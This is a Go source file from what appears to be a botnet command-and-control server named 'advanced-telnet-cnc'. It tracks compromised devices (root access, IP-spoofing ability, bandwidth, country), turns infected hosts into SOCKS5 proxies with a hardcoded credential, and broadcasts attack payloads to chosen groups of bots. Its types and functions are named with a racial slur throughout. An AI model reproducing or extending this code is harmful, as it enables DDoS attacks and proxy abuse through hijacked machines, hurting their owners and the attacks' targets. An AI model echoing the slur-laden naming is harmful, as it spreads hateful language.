package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"
)

func (list *SlaveHandler) IsIPConnected(host string) bool {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()
	_, ok := list.IPs[host]
	if ok {
		return true
	}
	_, ok = list.PendingIPs[host]
	return ok
}

func (list *SlaveHandler) AddPending(host string) {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()
	list.PendingIPs[host] = struct{}{}
}

func (list *SlaveHandler) RemovePending(host string) {
	list.Mutex.Lock()
	defer list.Mutex.Unlock()
	delete(list.PendingIPs, host)
}

func (list *SlaveHandler) TotalCount() int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()
	return len(list.Bots)
}

func (list *SlaveHandler) Distribution() map[string]int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	res := make(map[string]int)
	for _, v := range list.Bots {
		res[v.Source]++
	}
	return res
}

func (list *SlaveHandler) Arches() map[string]int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	res := make(map[string]int)
	for _, v := range list.Bots {
		res[v.Arch]++
	}
	return res
}

func (list *SlaveHandler) Versions() map[string]int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	res := make(map[string]int)
	for _, v := range list.Bots {
		res[v.Version]++
	}
	return res
}

func (list *SlaveHandler) Countries() map[string]int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	res := make(map[string]int)
	for _, v := range list.Bots {
		res[v.Country]++
	}
	return res
}

func (list *SlaveHandler) TotalSpeed() string {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var totalMbps float64
	var totalPPS float64

	for _, v := range list.Bots {
		if v.Speedtest == "" {
			continue
		}

		parts := strings.Split(v.Speedtest, "|")
		if len(parts) == 2 {
			mbps, _ := strconv.ParseFloat(parts[0], 64)
			pps, _ := strconv.ParseFloat(parts[1], 64)
			totalMbps += mbps
			totalPPS += pps
		}
	}

	if totalMbps == 0 && totalPPS == 0 {
		return "0.00 Mbps @ 0 pps"
	}

	totalGbps := totalMbps / 1024.0

	var speedStr string
	if totalMbps >= 1024*1024 {
		speedStr = fmt.Sprintf("%.2f Tbps", totalMbps/(1024*1024))
	} else if totalMbps >= 1024 {
		speedStr = fmt.Sprintf("%.2f Gbps", totalGbps)
	} else {
		speedStr = fmt.Sprintf("%.2f Mbps", totalMbps)
	}

	var ppsStr string
	if totalPPS >= 1000000000 {
		ppsStr = fmt.Sprintf("%.2f Bpps", totalPPS/1000000000.0)
	} else if totalPPS >= 1000000 {
		ppsStr = fmt.Sprintf("%.2f Mpps", totalPPS/1000000.0)
	} else if totalPPS >= 1000 {
		ppsStr = fmt.Sprintf("%.2f Kpps", totalPPS/1000.0)
	} else {
		ppsStr = fmt.Sprintf("%.0f pps", totalPPS)
	}

	return fmt.Sprintf("%s @ %s", speedStr, ppsStr)
}

func (list *SlaveHandler) RootedCount() int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var total int
	for _, v := range list.Bots {
		if v.Root {
			total++
		}
	}
	return total
}

func (list *SlaveHandler) SpoofedCount() int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var total int
	for _, v := range list.Bots {
		if v.Spoof {
			total++
		}
	}
	return total
}

func (list *SlaveHandler) TotalRAM() int64 {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var total int64
	for _, v := range list.Bots {
		if v.RAM != "" {
			var ram int64
			fmt.Sscanf(v.RAM, "%d", &ram)
			total += ram
		}
	}
	return total
}

func (list *SlaveHandler) TotalCores() int64 {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var total int64
	for _, v := range list.Bots {
		if v.Cores != "" {
			var cores int64
			fmt.Sscanf(v.Cores, "%d", &cores)
			total += cores
		}
	}
	return total
}

func (list *SlaveHandler) TestForProxy(c *Nigger) {
	host, _, err := net.SplitHostPort(c.RemoteAddr().String())
	if err != nil {
		return
	}

	config.Logger.Info("Proxy registered (Reverse/NAT)", "host", host, "port", "26721")
	list.Proxy[c] = "socks5://Tadashi:3Wb5WfDEblAOkD0xF3OTPmxWe6cmsR@" + host + ":26721"
}

func (list *SlaveHandler) AddNigger(c *Nigger) {
	list.Add <- c
	config.Logger.Info("Added nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
	if strings.Contains(c.Version, "socks5") {
		go list.TestForProxy(c)
	}
}

func (list *SlaveHandler) TerminateNigger(c *Nigger) {
	list.Delete <- c
	config.Logger.Info("Terminated nigger", "source", c.Source, "arch", c.Arch, "remote", c.RemoteAddr().String())
}

func (list *SlaveHandler) Broadcast(payload []byte, group string, country string, maxBots int) {
	attack := &NiggerCommand{payload, maxBots, group, country}
	list.Command <- attack
}

func (list *SlaveHandler) CountMatching(group string, country string, maxBots int) int {
	list.Mutex.RLock()
	defer list.Mutex.RUnlock()

	var count int
	for _, v := range list.Bots {
		if maxBots != -1 && count >= maxBots {
			break
		}

		if (group == "" || group == v.Source) && (country == "" || strings.EqualFold(country, v.Country) || strings.EqualFold(country, v.CountryISO)) {
			count++
		}
	}
	return count
}

func (list *SlaveHandler) makeNiggersWorkFaster() {
	for {
		select {
		case delta := <-list.totalCount:
			list.count += delta
		}
	}
}

func (list *SlaveHandler) makeNiggersWork() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-list.Add:
			list.Mutex.Lock()
			host, _, _ := net.SplitHostPort(add.RemoteAddr().String())
			list.IPs[host]++
			list.totalCount <- 1
			list.ID++
			add.ID = list.ID
			list.Bots[add.ID] = add
			list.Mutex.Unlock()

		case del := <-list.Delete:
			list.Mutex.Lock()
			host, _, _ := net.SplitHostPort(del.RemoteAddr().String())
			if val, ok := list.IPs[host]; ok {
				if val > 1 {
					list.IPs[host]--
				} else {
					delete(list.IPs, host)
				}
			}
			list.totalCount <- -1
			delete(list.Bots, del.ID)
			delete(list.Proxy, del)
			list.Mutex.Unlock()

		case atk := <-list.Command:
			list.Mutex.Lock()
			estimatedCount := len(list.Bots)
			if atk.Count != -1 && atk.Count < estimatedCount {
				estimatedCount = atk.Count
			}

			targets := make([]*Nigger, 0, estimatedCount)
			for _, v := range list.Bots {
				if atk.Count != -1 && len(targets) >= atk.Count {
					break
				}
				if (atk.Group == "" || atk.Group == v.Source) && (atk.Country == "" || strings.EqualFold(atk.Country, v.Country) || strings.EqualFold(atk.Country, v.CountryISO)) {
					targets = append(targets, v)
				}
			}
			list.Mutex.Unlock()

			go func(clients []*Nigger, payload []byte) {
				sem := make(chan struct{}, 1024)
				for _, c := range clients {
					sem <- struct{}{}
					go func(bot *Nigger) {
						defer func() { <-sem }()
						bot.SetWriteDeadline(time.Now().Add(7 * time.Second))
						bot.Write(payload)
					}(c)
				}
			}(targets, atk.Buffer)
		}
	}
}
